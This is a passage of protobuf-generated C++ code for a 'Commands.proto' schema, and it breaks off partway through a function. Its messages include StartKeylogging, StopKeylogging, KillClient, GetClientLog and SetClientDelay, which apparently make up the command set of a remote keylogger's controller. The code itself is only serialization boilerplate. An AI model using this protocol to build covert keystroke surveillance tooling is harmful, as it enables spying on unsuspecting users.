// Generated by the protocol buffer compiler.  DO NOT EDIT!
// source: Commands.proto

#define INTERNAL_SUPPRESS_PROTOBUF_FIELD_DEPRECATION
#include "Commands.pb.h"

#include <algorithm>

#include <google/protobuf/stubs/common.h>
#include <google/protobuf/stubs/port.h>
#include <google/protobuf/stubs/once.h>
#include <google/protobuf/io/coded_stream.h>
#include <google/protobuf/wire_format_lite_inl.h>
#include <google/protobuf/descriptor.h>
#include <google/protobuf/generated_message_reflection.h>
#include <google/protobuf/reflection_ops.h>
#include <google/protobuf/wire_format.h>
// @@protoc_insertion_point(includes)

namespace {

const ::google::protobuf::Descriptor* GetClientLog_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  GetClientLog_reflection_ = NULL;
const ::google::protobuf::Descriptor* ClientList_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  ClientList_reflection_ = NULL;
const ::google::protobuf::Descriptor* ClientStatus_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  ClientStatus_reflection_ = NULL;
const ::google::protobuf::Descriptor* StartKeylogging_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  StartKeylogging_reflection_ = NULL;
const ::google::protobuf::Descriptor* StopKeylogging_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  StopKeylogging_reflection_ = NULL;
const ::google::protobuf::Descriptor* KillClient_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  KillClient_reflection_ = NULL;
const ::google::protobuf::Descriptor* SetClientDelay_descriptor_ = NULL;
const ::google::protobuf::internal::GeneratedMessageReflection*
  SetClientDelay_reflection_ = NULL;

}  // namespace


void protobuf_AssignDesc_Commands_2eproto() GOOGLE_ATTRIBUTE_COLD;
void protobuf_AssignDesc_Commands_2eproto() {
  protobuf_AddDesc_Commands_2eproto();
  const ::google::protobuf::FileDescriptor* file =
    ::google::protobuf::DescriptorPool::generated_pool()->FindFileByName(
      "Commands.proto");
  GOOGLE_CHECK(file != NULL);
  GetClientLog_descriptor_ = file->message_type(0);
  static const int GetClientLog_offsets_[1] = {
    GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(GetClientLog, limit_),
  };
  GetClientLog_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      GetClientLog_descriptor_,
      GetClientLog::default_instance_,
      GetClientLog_offsets_,
      -1,
      -1,
      -1,
      sizeof(GetClientLog),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(GetClientLog, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(GetClientLog, _is_default_instance_));
  ClientList_descriptor_ = file->message_type(1);
  static const int ClientList_offsets_[1] = {
  };
  ClientList_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      ClientList_descriptor_,
      ClientList::default_instance_,
      ClientList_offsets_,
      -1,
      -1,
      -1,
      sizeof(ClientList),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(ClientList, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(ClientList, _is_default_instance_));
  ClientStatus_descriptor_ = file->message_type(2);
  static const int ClientStatus_offsets_[1] = {
  };
  ClientStatus_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      ClientStatus_descriptor_,
      ClientStatus::default_instance_,
      ClientStatus_offsets_,
      -1,
      -1,
      -1,
      sizeof(ClientStatus),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(ClientStatus, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(ClientStatus, _is_default_instance_));
  StartKeylogging_descriptor_ = file->message_type(3);
  static const int StartKeylogging_offsets_[1] = {
  };
  StartKeylogging_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      StartKeylogging_descriptor_,
      StartKeylogging::default_instance_,
      StartKeylogging_offsets_,
      -1,
      -1,
      -1,
      sizeof(StartKeylogging),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(StartKeylogging, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(StartKeylogging, _is_default_instance_));
  StopKeylogging_descriptor_ = file->message_type(4);
  static const int StopKeylogging_offsets_[1] = {
  };
  StopKeylogging_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      StopKeylogging_descriptor_,
      StopKeylogging::default_instance_,
      StopKeylogging_offsets_,
      -1,
      -1,
      -1,
      sizeof(StopKeylogging),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(StopKeylogging, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(StopKeylogging, _is_default_instance_));
  KillClient_descriptor_ = file->message_type(5);
  static const int KillClient_offsets_[1] = {
  };
  KillClient_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      KillClient_descriptor_,
      KillClient::default_instance_,
      KillClient_offsets_,
      -1,
      -1,
      -1,
      sizeof(KillClient),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(KillClient, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(KillClient, _is_default_instance_));
  SetClientDelay_descriptor_ = file->message_type(6);
  static const int SetClientDelay_offsets_[1] = {
    GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(SetClientDelay, delay_),
  };
  SetClientDelay_reflection_ =
    ::google::protobuf::internal::GeneratedMessageReflection::NewGeneratedMessageReflection(
      SetClientDelay_descriptor_,
      SetClientDelay::default_instance_,
      SetClientDelay_offsets_,
      -1,
      -1,
      -1,
      sizeof(SetClientDelay),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(SetClientDelay, _internal_metadata_),
      GOOGLE_PROTOBUF_GENERATED_MESSAGE_FIELD_OFFSET(SetClientDelay, _is_default_instance_));
}

namespace {

GOOGLE_PROTOBUF_DECLARE_ONCE(protobuf_AssignDescriptors_once_);
inline void protobuf_AssignDescriptorsOnce() {
  ::google::protobuf::GoogleOnceInit(&protobuf_AssignDescriptors_once_,
                 &protobuf_AssignDesc_Commands_2eproto);
}

void protobuf_RegisterTypes(const ::std::string&) GOOGLE_ATTRIBUTE_COLD;
void protobuf_RegisterTypes(const ::std::string&) {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      GetClientLog_descriptor_, &GetClientLog::default_instance());
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      ClientList_descriptor_, &ClientList::default_instance());
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      ClientStatus_descriptor_, &ClientStatus::default_instance());
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      StartKeylogging_descriptor_, &StartKeylogging::default_instance());
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      StopKeylogging_descriptor_, &StopKeylogging::default_instance());
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      KillClient_descriptor_, &KillClient::default_instance());
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedMessage(
      SetClientDelay_descriptor_, &SetClientDelay::default_instance());
}

}  // namespace

void protobuf_ShutdownFile_Commands_2eproto() {
  delete GetClientLog::default_instance_;
  delete GetClientLog_reflection_;
  delete ClientList::default_instance_;
  delete ClientList_reflection_;
  delete ClientStatus::default_instance_;
  delete ClientStatus_reflection_;
  delete StartKeylogging::default_instance_;
  delete StartKeylogging_reflection_;
  delete StopKeylogging::default_instance_;
  delete StopKeylogging_reflection_;
  delete KillClient::default_instance_;
  delete KillClient_reflection_;
  delete SetClientDelay::default_instance_;
  delete SetClientDelay_reflection_;
}

void protobuf_AddDesc_Commands_2eproto() GOOGLE_ATTRIBUTE_COLD;
void protobuf_AddDesc_Commands_2eproto() {
  static bool already_here = false;
  if (already_here) return;
  already_here = true;
  GOOGLE_PROTOBUF_VERIFY_VERSION;

  ::google::protobuf::DescriptorPool::InternalAddGeneratedFile(
    "\n\016Commands.proto\"\035\n\014GetClientLog\022\r\n\005limi"
    "t\030\001 \001(\005\"\014\n\nClientList\"\016\n\014ClientStatus\"\021\n"
    "\017StartKeylogging\"\020\n\016StopKeylogging\"\014\n\nKi"
    "llClient\"\037\n\016SetClientDelay\022\r\n\005delay\030\001 \001("
    "\005b\006proto3", 169);
  ::google::protobuf::MessageFactory::InternalRegisterGeneratedFile(
    "Commands.proto", &protobuf_RegisterTypes);
  GetClientLog::default_instance_ = new GetClientLog();
  ClientList::default_instance_ = new ClientList();
  ClientStatus::default_instance_ = new ClientStatus();
  StartKeylogging::default_instance_ = new StartKeylogging();
  StopKeylogging::default_instance_ = new StopKeylogging();
  KillClient::default_instance_ = new KillClient();
  SetClientDelay::default_instance_ = new SetClientDelay();
  GetClientLog::default_instance_->InitAsDefaultInstance();
  ClientList::default_instance_->InitAsDefaultInstance();
  ClientStatus::default_instance_->InitAsDefaultInstance();
  StartKeylogging::default_instance_->InitAsDefaultInstance();
  StopKeylogging::default_instance_->InitAsDefaultInstance();
  KillClient::default_instance_->InitAsDefaultInstance();
  SetClientDelay::default_instance_->InitAsDefaultInstance();
  ::google::protobuf::internal::OnShutdown(&protobuf_ShutdownFile_Commands_2eproto);
}

// Force AddDescriptors() to be called at static initialization time.
struct StaticDescriptorInitializer_Commands_2eproto {
  StaticDescriptorInitializer_Commands_2eproto() {
    protobuf_AddDesc_Commands_2eproto();
  }
} static_descriptor_initializer_Commands_2eproto_;

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
const int GetClientLog::kLimitFieldNumber;
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

GetClientLog::GetClientLog()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:GetClientLog)
}

void GetClientLog::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

GetClientLog::GetClientLog(const GetClientLog& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:GetClientLog)
}

void GetClientLog::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
  limit_ = 0;
}

GetClientLog::~GetClientLog() {
  // @@protoc_insertion_point(destructor:GetClientLog)
  SharedDtor();
}

void GetClientLog::SharedDtor() {
  if (this != default_instance_) {
  }
}

void GetClientLog::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* GetClientLog::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return GetClientLog_descriptor_;
}

const GetClientLog& GetClientLog::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

GetClientLog* GetClientLog::default_instance_ = NULL;

GetClientLog* GetClientLog::New(::google::protobuf::Arena* arena) const {
  GetClientLog* n = new GetClientLog;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void GetClientLog::Clear() {
// @@protoc_insertion_point(message_clear_start:GetClientLog)
  limit_ = 0;
}

bool GetClientLog::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:GetClientLog)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
    switch (::google::protobuf::internal::WireFormatLite::GetTagFieldNumber(tag)) {
      // optional int32 limit = 1;
      case 1: {
        if (tag == 8) {
          DO_((::google::protobuf::internal::WireFormatLite::ReadPrimitive<
                   ::google::protobuf::int32, ::google::protobuf::internal::WireFormatLite::TYPE_INT32>(
                 input, &limit_)));

        } else {
          goto handle_unusual;
        }
        if (input->ExpectAtEnd()) goto success;
        break;
      }

      default: {
      handle_unusual:
        if (tag == 0 ||
            ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
            ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
          goto success;
        }
        DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
        break;
      }
    }
  }
success:
  // @@protoc_insertion_point(parse_success:GetClientLog)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:GetClientLog)
  return false;
#undef DO_
}

void GetClientLog::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:GetClientLog)
  // optional int32 limit = 1;
  if (this->limit() != 0) {
    ::google::protobuf::internal::WireFormatLite::WriteInt32(1, this->limit(), output);
  }

  // @@protoc_insertion_point(serialize_end:GetClientLog)
}

::google::protobuf::uint8* GetClientLog::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:GetClientLog)
  // optional int32 limit = 1;
  if (this->limit() != 0) {
    target = ::google::protobuf::internal::WireFormatLite::WriteInt32ToArray(1, this->limit(), target);
  }

  // @@protoc_insertion_point(serialize_to_array_end:GetClientLog)
  return target;
}

int GetClientLog::ByteSize() const {
// @@protoc_insertion_point(message_byte_size_start:GetClientLog)
  int total_size = 0;

  // optional int32 limit = 1;
  if (this->limit() != 0) {
    total_size += 1 +
      ::google::protobuf::internal::WireFormatLite::Int32Size(
        this->limit());
  }

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void GetClientLog::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:GetClientLog)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const GetClientLog* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const GetClientLog>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:GetClientLog)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:GetClientLog)
    MergeFrom(*source);
  }
}

void GetClientLog::MergeFrom(const GetClientLog& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:GetClientLog)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  if (from.limit() != 0) {
    set_limit(from.limit());
  }
}

void GetClientLog::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:GetClientLog)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void GetClientLog::CopyFrom(const GetClientLog& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:GetClientLog)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool GetClientLog::IsInitialized() const {

  return true;
}

void GetClientLog::Swap(GetClientLog* other) {
  if (other == this) return;
  InternalSwap(other);
}
void GetClientLog::InternalSwap(GetClientLog* other) {
  std::swap(limit_, other->limit_);
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata GetClientLog::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = GetClientLog_descriptor_;
  metadata.reflection = GetClientLog_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// GetClientLog

// optional int32 limit = 1;
void GetClientLog::clear_limit() {
  limit_ = 0;
}
 ::google::protobuf::int32 GetClientLog::limit() const {
  // @@protoc_insertion_point(field_get:GetClientLog.limit)
  return limit_;
}
 void GetClientLog::set_limit(::google::protobuf::int32 value) {
  
  limit_ = value;
  // @@protoc_insertion_point(field_set:GetClientLog.limit)
}

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

ClientList::ClientList()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:ClientList)
}

void ClientList::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

ClientList::ClientList(const ClientList& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:ClientList)
}

void ClientList::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
}

ClientList::~ClientList() {
  // @@protoc_insertion_point(destructor:ClientList)
  SharedDtor();
}

void ClientList::SharedDtor() {
  if (this != default_instance_) {
  }
}

void ClientList::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* ClientList::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return ClientList_descriptor_;
}

const ClientList& ClientList::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

ClientList* ClientList::default_instance_ = NULL;

ClientList* ClientList::New(::google::protobuf::Arena* arena) const {
  ClientList* n = new ClientList;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void ClientList::Clear() {
// @@protoc_insertion_point(message_clear_start:ClientList)
}

bool ClientList::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:ClientList)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
  handle_unusual:
    if (tag == 0 ||
        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
      goto success;
    }
    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
  }
success:
  // @@protoc_insertion_point(parse_success:ClientList)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:ClientList)
  return false;
#undef DO_
}

void ClientList::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:ClientList)
  // @@protoc_insertion_point(serialize_end:ClientList)
}

::google::protobuf::uint8* ClientList::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:ClientList)
  // @@protoc_insertion_point(serialize_to_array_end:ClientList)
  return target;
}

int ClientList::ByteSize() const {
// @@protoc_insertion_point(message_byte_size_start:ClientList)
  int total_size = 0;

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void ClientList::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:ClientList)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const ClientList* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const ClientList>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:ClientList)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:ClientList)
    MergeFrom(*source);
  }
}

void ClientList::MergeFrom(const ClientList& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:ClientList)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
}

void ClientList::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:ClientList)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void ClientList::CopyFrom(const ClientList& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:ClientList)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool ClientList::IsInitialized() const {

  return true;
}

void ClientList::Swap(ClientList* other) {
  if (other == this) return;
  InternalSwap(other);
}
void ClientList::InternalSwap(ClientList* other) {
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata ClientList::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = ClientList_descriptor_;
  metadata.reflection = ClientList_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// ClientList

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

ClientStatus::ClientStatus()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:ClientStatus)
}

void ClientStatus::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

ClientStatus::ClientStatus(const ClientStatus& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:ClientStatus)
}

void ClientStatus::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
}

ClientStatus::~ClientStatus() {
  // @@protoc_insertion_point(destructor:ClientStatus)
  SharedDtor();
}

void ClientStatus::SharedDtor() {
  if (this != default_instance_) {
  }
}

void ClientStatus::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* ClientStatus::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return ClientStatus_descriptor_;
}

const ClientStatus& ClientStatus::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

ClientStatus* ClientStatus::default_instance_ = NULL;

ClientStatus* ClientStatus::New(::google::protobuf::Arena* arena) const {
  ClientStatus* n = new ClientStatus;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void ClientStatus::Clear() {
// @@protoc_insertion_point(message_clear_start:ClientStatus)
}

bool ClientStatus::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:ClientStatus)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
  handle_unusual:
    if (tag == 0 ||
        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
      goto success;
    }
    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
  }
success:
  // @@protoc_insertion_point(parse_success:ClientStatus)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:ClientStatus)
  return false;
#undef DO_
}

void ClientStatus::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:ClientStatus)
  // @@protoc_insertion_point(serialize_end:ClientStatus)
}

::google::protobuf::uint8* ClientStatus::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:ClientStatus)
  // @@protoc_insertion_point(serialize_to_array_end:ClientStatus)
  return target;
}

int ClientStatus::ByteSize() const {
// @@protoc_insertion_point(message_byte_size_start:ClientStatus)
  int total_size = 0;

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void ClientStatus::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:ClientStatus)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const ClientStatus* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const ClientStatus>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:ClientStatus)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:ClientStatus)
    MergeFrom(*source);
  }
}

void ClientStatus::MergeFrom(const ClientStatus& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:ClientStatus)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
}

void ClientStatus::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:ClientStatus)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void ClientStatus::CopyFrom(const ClientStatus& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:ClientStatus)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool ClientStatus::IsInitialized() const {

  return true;
}

void ClientStatus::Swap(ClientStatus* other) {
  if (other == this) return;
  InternalSwap(other);
}
void ClientStatus::InternalSwap(ClientStatus* other) {
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata ClientStatus::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = ClientStatus_descriptor_;
  metadata.reflection = ClientStatus_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// ClientStatus

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

StartKeylogging::StartKeylogging()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:StartKeylogging)
}

void StartKeylogging::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

StartKeylogging::StartKeylogging(const StartKeylogging& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:StartKeylogging)
}

void StartKeylogging::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
}

StartKeylogging::~StartKeylogging() {
  // @@protoc_insertion_point(destructor:StartKeylogging)
  SharedDtor();
}

void StartKeylogging::SharedDtor() {
  if (this != default_instance_) {
  }
}

void StartKeylogging::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* StartKeylogging::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return StartKeylogging_descriptor_;
}

const StartKeylogging& StartKeylogging::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

StartKeylogging* StartKeylogging::default_instance_ = NULL;

StartKeylogging* StartKeylogging::New(::google::protobuf::Arena* arena) const {
  StartKeylogging* n = new StartKeylogging;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void StartKeylogging::Clear() {
// @@protoc_insertion_point(message_clear_start:StartKeylogging)
}

bool StartKeylogging::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:StartKeylogging)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
  handle_unusual:
    if (tag == 0 ||
        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
      goto success;
    }
    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
  }
success:
  // @@protoc_insertion_point(parse_success:StartKeylogging)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:StartKeylogging)
  return false;
#undef DO_
}

void StartKeylogging::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:StartKeylogging)
  // @@protoc_insertion_point(serialize_end:StartKeylogging)
}

::google::protobuf::uint8* StartKeylogging::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:StartKeylogging)
  // @@protoc_insertion_point(serialize_to_array_end:StartKeylogging)
  return target;
}

int StartKeylogging::ByteSize() const {
